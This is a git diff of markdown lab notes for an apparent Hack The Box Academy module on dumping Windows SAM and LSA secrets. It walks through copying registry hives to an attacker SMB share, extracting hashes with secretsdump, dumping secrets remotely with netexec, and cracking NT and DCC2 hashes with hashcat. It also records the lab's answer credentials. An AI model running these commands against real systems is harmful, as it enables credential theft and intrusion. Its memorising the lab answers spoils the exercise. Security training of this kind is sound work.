@@ -49,7 +49,7 @@ If we're only interested in dumping the hashes of local users, we need only **HK
 ### Creating a share with smbserver
 We simply run `smbserver.py -smb2support`, specify a name for the share (e.g., `CompData`), and point to the local directory on our attack host where the hive copies will be stored (e.g., `/home/ltnbob/Documents`). The `-smb2support` flag ensures compatibility with newer versions of SMB. 
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -78,7 +78,7 @@ C:\> move system.save \\10.10.15.16\CompData
 
 ## Dumping hashes with secretsdump
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ locate secretsdump 
 /usr/share/doc/python3-impacket/examples/secretsdump.py
 masterofblafu@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
@@ -116,7 +116,7 @@ Notice that the first step **secretsdump** performs is retrieving the **system b
 
 Moving on, notice the following line:
 
-```sh
+```shellsession
 Dumping local SAM hashes (uid:rid:lmhash:nthash)
 ```
 
@@ -128,7 +128,7 @@ With this in mind, we can copy the NT hashes associated with each user account i
 ### Running Hashcat against NT hashes
 We will focus on using the `-m` option to specify hash type `1000`, which corresponds to NT hashes (also known as NTLM-based hashes).
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
 
 hashcat (v6.1.1) starting...
@@ -175,7 +175,7 @@ inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2
 
 This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash (which we will cover later). The Hashcat mode for cracking DCC2 hashes is `2100`.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
 
 <SNIP>
@@ -260,7 +260,7 @@ With access to credentials that have **local administrator privileges**, it is a
 
 ### Dumping LSA secrets remotely
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
 
 SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
@@ -275,7 +275,7 @@ SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bo
 
 ### Dumping SAM Remotely
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
 
 SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
@@ -319,7 +319,7 @@ RDP to **10.129.202.137** (ACADEMY-PWATTACKS-WIN10SAM) with user "**Bob**" and p
                 1 file(s) moved.
         ```
    - Dump hashes with secretsdump → copy the NT hash of user `ITbackdoor` to `hash.txt`:
-        ```sh
+        ```shellsession
         $ secretsdump.py -sam Desktop/sam.save -security Desktop/security.save -system Desktop/system.save LOCAL
         Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -350,7 +350,7 @@ RDP to **10.129.202.137** (ACADEMY-PWATTACKS-WIN10SAM) with user "**Bob**" and p
         $ echo c02478537b9727d391bc80011c2e2321 > hash.txt
         ```
    - Crack the hash offline using hashcat → found password for user `ITbackdoor`:`matrix`
-        ```sh
+        ```shellsession
         $ sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
         <SNIP>
         c02478537b9727d391bc80011c2e2321:matrix                   
@@ -363,7 +363,7 @@ RDP to **10.129.202.137** (ACADEMY-PWATTACKS-WIN10SAM) with user "**Bob**" and p
         ```
 3.  Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive) **Answer: frontdesk:Password123**
    - Dump LSA secrets remotely using netexec:
-        ```sh
+        ```shellsession
         $ netexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
         SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
         SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
